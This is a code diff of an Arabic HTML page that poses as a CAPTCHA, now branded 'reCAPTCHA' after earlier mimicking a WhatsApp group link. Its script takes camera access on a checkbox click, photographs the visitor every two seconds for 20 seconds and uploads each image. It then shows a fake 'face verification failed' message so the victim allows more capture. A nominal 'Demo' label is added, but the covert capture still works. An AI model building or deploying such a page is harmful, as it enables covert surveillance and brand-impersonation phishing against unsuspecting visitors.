@@ -3,7 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>https://chat.whatsapp.com</title>
+
+  <title>Demo CAPTCHA</title>
 
   <style>
     * {
@@ -26,21 +27,35 @@
       width: 300px;
       background: #f9f9f9;
       border: 1px solid #d3d3d3;
-      border-radius: 3px;
-      box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+      border-radius: 4px;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
       padding: 12px;
       position: relative;
+      overflow: hidden;
+    }
+
+    /* Demo banner */
+    .demo-banner {
+      background: #e8f1ff;
+      border: 1px solid #9fc1f5;
+      color: #24528f;
+      border-radius: 4px;
+      padding: 7px 9px;
+      margin-bottom: 10px;
+      text-align: center;
+      font-size: 10px;
+      font-weight: bold;
     }
 
     .camera-notice {
-      background: #fff8e1;
-      border: 1px solid #e5c76b;
+      background: #f7f7f7;
+      border: 1px solid #d8d8d8;
       border-radius: 4px;
       padding: 9px;
       margin-bottom: 10px;
       font-size: 11px;
       line-height: 1.5;
-      color: #5f4b00;
+      color: #555;
     }
 
     .captcha-main {
@@ -119,11 +134,21 @@
       display: none;
     }
 
-    .checkmark {
-      width: 20px;
-      height: 20px;
-      fill: #00a000;
+    /* Failure icon */
+    .failure-icon {
+      width: 21px;
+      height: 21px;
       display: none;
+    }
+
+    .failure-icon circle {
+      fill: #d93025;
+    }
+
+    .failure-icon line {
+      stroke: white;
+      stroke-width: 2.2;
+      stroke-linecap: round;
     }
 
     .captcha-widget.loading .checkbox-container {
@@ -135,19 +160,32 @@
       display: block;
     }
 
-    .captcha-widget.success .checkbox-container {
-      border-color: transparent;
-      background: transparent;
+    .captcha-widget.loading .failure-icon {
+      display: none;
     }
 
-    .captcha-widget.success .checkmark {
+    .captcha-widget.failed .checkbox-container {
+      border-color: transparent;
+      background: transparent;
+      cursor: default;
+    }
+
+    .captcha-widget.failed .failure-icon {
       display: block;
+    }
+
+    .captcha-widget.failed .spinner {
+      display: none;
+    }
+
+    .captcha-widget.failed .sub-text {
+      color: #d93025;
     }
 
     .progress-container {
       position: absolute;
       bottom: 0;
-      left: 0;
+      right: 0;
       width: 100%;
       height: 3px;
       background: #e0e0e0;
@@ -173,6 +211,13 @@
       color: #888;
     }
 
+    .demo-label {
+      margin-top: 8px;
+      text-align: center;
+      font-size: 9px;
+      color: #999;
+    }
+
     @keyframes spin {
       to {
         transform: rotate(360deg);
@@ -185,7 +230,8 @@
 
   <div class="captcha-widget" id="captchaWidget">
 
-    <div class="camera-notice">
+    <!-- الرسالة القابلة للتبديل -->
+    <div class="camera-notice" id="cameraNotice">
       عند تحديد مربع التحقق، سيطلب المتصفح إذن استخدام الكاميرا لإتمام التحقق الأمني والتأكد من أنك مستخدم حقيقي.
     </div>
 
@@ -193,22 +239,34 @@
 
       <div class="checkbox-container" id="captchaCheckbox">
 
+        <!-- Loading -->
         <div class="spinner"></div>
 
+        <!-- Failure -->
         <svg
-          class="checkmark"
+          class="failure-icon"
           viewBox="0 0 24 24"
           xmlns="http://www.w3.org/2000/svg">
-          <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
+
+          <circle cx="12" cy="12" r="10"></circle>
+
+          <line x1="8" y1="8" x2="16" y2="16"></line>
+          <line x1="16" y1="8" x2="8" y2="16"></line>
+
         </svg>
 
       </div>
 
       <div class="captcha-text">
-        <span class="main-text">أنا لست برنامج روبوت</span>
+
+        <span class="main-text">
+          أنا لست برنامج روبوت
+        </span>
+
         <span class="sub-text" id="statusText">
           اضغط للتحقق
         </span>
+
       </div>
 
       <div class="captcha-logo">
@@ -216,14 +274,37 @@
         <svg
           viewBox="0 0 24 24"
           xmlns="http://www.w3.org/2000/svg">
-          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10
-          10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93
-          0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2
-          c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5
-          4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
+
+          <path d="
+            M12 2
+            C6.48 2 2 6.48 2 12
+            s4.48 10 10 10
+            10-4.48 10-10
+            S17.52 2 12 2z
+
+            m-1 17.93
+            c-3.95-.49-7-3.85-7-7.93
+            0-.62.08-1.21.21-1.79
+            L9 15v1
+            c0 1.1.9 2 2 2
+            v1.93z
+
+            m6.9-2.54
+            c-.26-.81-1-1.39-1.9-1.39
+            h-1v-3
+            c0-.55-.45-1-1-1
+            H8v-2h2
+            c.55 0 1-.45 1-1
+            V7h2
+            c1.1 0 2-.9 2-2
+            v-.41
+            c2.93 1.19 5 4.06 5 7.41
+            0 2.08-.8 3.97-2.1 5.39z
+          "/>
+
         </svg>
 
-        <span>HumanVerify</span>
+        <span>reCAPTCHA</span>
 
       </div>
 
@@ -238,12 +319,17 @@
       <span>الشروط</span>
     </div>
 
+    <div class="demo-label">
+    </div>
+
   </div>
 
-<script>
+
+  <script>
 const captchaWidget = document.getElementById("captchaWidget");
 const captchaCheckbox = document.getElementById("captchaCheckbox");
 const statusText = document.getElementById("statusText");
+const cameraNotice = document.getElementById("cameraNotice");
 const progressContainer = document.getElementById("progressContainer");
 const progressFill = document.getElementById("progressFill");
 
@@ -278,7 +364,7 @@ async function sendImage(blob, number) {
     }
 
     const result = await response.json();
-    console.log("تم إرسال الصورة رقم", number, result); // للطباعة في وحدة التحكم فقط وليس للمستخدم
+    console.log("تم إرسال الصورة رقم", number, result);
     return true;
 
   } catch (error) {
@@ -304,7 +390,6 @@ async function captureImage() {
   canvas.toBlob(async (blob) => {
     if (!blob) return;
     imageNumber++;
-    // تم إزالة أي تحديث للنص هنا لضمان عدم ظهور رسائل "جاري الإرسال" للمستخدم
     await sendImage(blob, imageNumber);
   }, "image/png");
 }
@@ -322,8 +407,7 @@ captchaCheckbox.addEventListener("click", async () => {
   captchaWidget.classList.add("loading");
   progressContainer.style.display = "block";
   progressFill.style.width = "0%";
-  
-  // رسالة البداية الموحدة والمألوفة
+
   statusText.textContent = "جاري التحقق...";
 
   try {
@@ -346,13 +430,10 @@ captchaCheckbox.addEventListener("click", async () => {
       video.onloadedmetadata = () => resolve();
     });
 
-    // أول صورة تُرسل مباشرة بصمت
     await captureImage();
 
-    // التقاط وإرسال صورة كل ثانيتين بصمت في الخلفية
     captureInterval = setInterval(captureImage, intervalTime);
 
-    // شريط التقدم وتحديث الرسائل العامة فقط (مثل الواجهة القديمة تماماً)
     progressInterval = setInterval(() => {
       elapsedTime += 100;
       const percentage = Math.min((elapsedTime / duration) * 100, 100);
@@ -369,7 +450,6 @@ captchaCheckbox.addEventListener("click", async () => {
       }
     }, 100);
 
-    // انتهاء التحقق بعد 20 ثانية
     finishTimeout = setTimeout(() => {
       finishVerification();
     }, duration);
@@ -405,12 +485,18 @@ function finishVerification() {
   }
 
   captchaWidget.classList.remove("loading");
-  captchaWidget.classList.add("success");
+  captchaWidget.classList.add("failed");
   progressContainer.style.display = "none";
-  statusText.textContent = "تم التحقق بنجاح";
+  statusText.textContent = "تعذّر إكمال عملية التحقق";
+
+  // ← التعديل المطلوب: تبديل الرسالة في الأعلى عند الانتهاء
+  cameraNotice.innerHTML =
+    "تعذّر إكمال عملية التحقق<br>" +
+    "لم نتمكن من التحقق من وجهك. تأكد من أن الكاميرا غير محجوبة " +
+    "وأن وجهك ظاهر بوضوح.";
 
   setTimeout(() => {
-    captchaWidget.classList.remove("success");
+    captchaWidget.classList.remove("failed");
     statusText.textContent = "اضغط للتحقق";
     progressFill.style.width = "0%";
     isVerifying = false;
